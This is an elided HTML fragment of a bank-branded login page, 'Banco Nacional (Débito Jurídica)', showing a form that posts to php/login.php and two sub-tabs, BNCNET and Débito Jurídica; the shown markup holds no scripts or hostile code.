...
<head>
  ...
  <title>Login - Banco Nacional (Débito Jurídica)</title>
  ...
  <div class="wrapper">
    <form class="login-container" id="login-form" action="php/login.php" method="POST">
      ...
      <div class="sub-tabs" id="sub-tabs-empresas">
        <button type="button" id="btn-bncnet" class="non-active">BNCNET</button>
        <button type="button" id="btn-debito-juridica" class="active">Débito Jurídica</button>
      </div>
